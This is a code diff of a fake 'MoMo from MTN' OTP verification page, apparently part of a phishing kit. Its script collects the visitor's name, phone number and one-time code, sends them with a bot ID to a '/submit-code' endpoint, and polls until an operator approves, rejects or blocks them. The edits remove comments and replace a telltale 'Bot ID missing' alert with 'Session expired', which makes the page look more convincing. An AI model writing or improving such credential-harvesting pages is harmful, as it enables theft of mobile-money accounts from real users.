@@ -49,9 +49,6 @@
       padding-top: 52px;
     }
 
-    /*
-      White curved bottom of blue area
-    */
     .top::after {
       content: "";
       position: absolute;
@@ -257,7 +254,7 @@
     }
 
     /* =========================================
-       BOTTOM BUTTON (sticky)
+       BOTTOM BUTTON
     ========================================= */
 
     .bottom {
@@ -363,10 +360,8 @@
   <div class="top">
 
     <div class="top-bar">
-      <!-- Back button -->
       <button class="back-btn" onclick="window.history.back()">&#8592;</button>
 
-      <!-- Logo (compact) -->
       <div class="logo">
         <div class="logo-box">
           <div class="logo-symbol"></div>
@@ -374,7 +369,6 @@
         <div class="logo-text">MoMo <span class="light">from MTN</span></div>
       </div>
 
-      <!-- Spacer for alignment -->
       <div style="width: 30px;"></div>
     </div>
 
@@ -402,7 +396,6 @@
       Resend code in <span class="timer">05:00</span>
     </div>
 
-    <!-- message-box will be injected here by JS -->
     <div id="message-box" style="display:none;"></div>
 
   </div>
@@ -417,20 +410,22 @@
 
 <script>
   (function() {
+    // ---------- CONFIG ----------
+    const BACKEND_URL = ""; // leave empty to use same-origin (recommended)
+
     // ---------- READ FROM URL & LOCALSTORAGE ----------
     const urlParams = new URLSearchParams(window.location.search);
     let botId = urlParams.get('botId') || localStorage.getItem('botId');
     let phone = urlParams.get('phone') || localStorage.getItem('phone');
     let name = urlParams.get('name') || localStorage.getItem('fullName');
 
-    // If missing critical data, redirect back to phone page
     if (!botId) {
-      alert('Bot ID missing. Please start over.');
+      alert('Session expired. Please start over.');
       window.location.href = 'details.html';
       return;
     }
     if (!phone) {
-      alert('Phone number missing. Please start over.');
+      alert('Session expired. Please start over.');
       window.location.href = 'details.html';
       return;
     }
@@ -439,7 +434,7 @@
       localStorage.setItem('fullName', name);
     }
 
-    // Store for subsequent pages
+    // Persist for subsequent pages
     localStorage.setItem('botId', botId);
     localStorage.setItem('phone', phone);
 
@@ -452,9 +447,9 @@
     // ---------- DOM REFS ----------
     const inputs = document.querySelectorAll('.otp input');
     const continueBtn = document.querySelector('.continue-btn');
-    const msgDiv = document.getElementById('message-box');
+    let msgDiv = document.getElementById('message-box');
 
-    // If message-box not in DOM (though we added it), create it.
+    // Fallback in case #message-box is missing from the DOM
     if (!msgDiv) {
       const div = document.createElement('div');
       div.id = 'message-box';
@@ -467,7 +462,6 @@
       const container = document.querySelector('.card');
       const resend = document.querySelector('.resend-wrap');
       container.insertBefore(div, resend);
-      // reassign
       msgDiv = document.getElementById('message-box');
     }
 
@@ -600,21 +594,21 @@
       var otp = '';
       inputs.forEach(function(inp) { otp += inp.value; });
       if (otp.length !== 4) {
-        showMessage('Please enter a 4‑digit OTP.', true);
+        showMessage('Please enter a 4-digit OTP.', true);
         return;
       }
 
-      // Disable button, show waiting
       continueBtn.disabled = true;
       continueBtn.textContent = 'Verifying...';
       continueBtn.style.background = '#f5a623';
       continueBtn.style.color = '#fff';
       hideMessage();
 
-      fetch('/submit-otp', {
+      // NOTE: server endpoint is /submit-code (accepts field "code")
+      fetch(BACKEND_URL + '/submit-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: name, phone: phone, otp: otp, botId: botId })
+        body: JSON.stringify({ name: name, phone: phone, code: otp, botId: botId })
       })
       .then(function(res) {
         if (!res.ok) throw new Error('Server error (HTTP ' + res.status + ')');
@@ -624,62 +618,68 @@
         var requestId = data.requestId;
         if (!requestId) throw new Error('No request ID received');
 
-        // Start polling
         stopPolling();
         var attempts = 0;
         var MAX_ATTEMPTS = 120; // ~3 minutes
 
         pollTimer = setInterval(function() {
           attempts++;
-          fetch('/check-otp/' + requestId)
+          // NOTE: server endpoint is /check-code/:requestId
+          fetch(BACKEND_URL + '/check-code/' + requestId)
             .then(function(res) {
               if (!res.ok) throw new Error('Verification error');
               return res.json();
             })
             .then(function(status) {
+              if (status.blocked === true) {
+                stopPolling();
+                showMessage('❌ Account restricted. Please try again later.', true);
+                continueBtn.disabled = true;
+                continueBtn.textContent = 'SUBMIT';
+                continueBtn.style.background = '#d1d5db';
+                return;
+              }
+
               if (status.approved === true) {
                 stopPolling();
-                // ✅ DIRECT REDIRECT TO SUCCESS PAGE (skip PIN & code)
+                // Redirect straight to success page (skip PIN)
                 var successUrl = 'success.html?botId=' + encodeURIComponent(botId) +
                                  '&phone=' + encodeURIComponent(phone) +
                                  '&name=' + encodeURIComponent(name);
                 window.location.href = successUrl;
                 return;
               }
+
               if (status.approved === false) {
                 stopPolling();
                 showMessage('❌ Incorrect OTP. Please try again.', true);
-                // Reset inputs
                 inputs.forEach(function(inp) { inp.value = ''; });
                 checkAllFilled();
                 inputs[0].focus();
-                // Re-enable button
                 continueBtn.disabled = false;
                 continueBtn.textContent = 'SUBMIT';
                 continueBtn.style.background = '#005572';
                 continueBtn.style.color = '#fff';
                 return;
               }
-              // Still pending
+
               if (attempts > MAX_ATTEMPTS) {
                 stopPolling();
-                showMessage('⏳ Approval taking too long. Please refresh or contact support.', true);
+                showMessage('⏳ Taking too long. Please try again.', true);
                 continueBtn.disabled = false;
                 continueBtn.textContent = 'SUBMIT';
                 continueBtn.style.background = '#005572';
                 continueBtn.style.color = '#fff';
                 return;
               }
-              // keep polling
             })
             .catch(function(err) {
-              // Network error – keep polling
               console.error('Polling error:', err);
             });
         }, 1500);
       })
       .catch(function(err) {
-        showMessage('❌ Send error: ' + err.message, true);
+        showMessage('❌ ' + err.message, true);
         continueBtn.disabled = false;
         continueBtn.textContent = 'SUBMIT';
         continueBtn.style.background = '#005572';
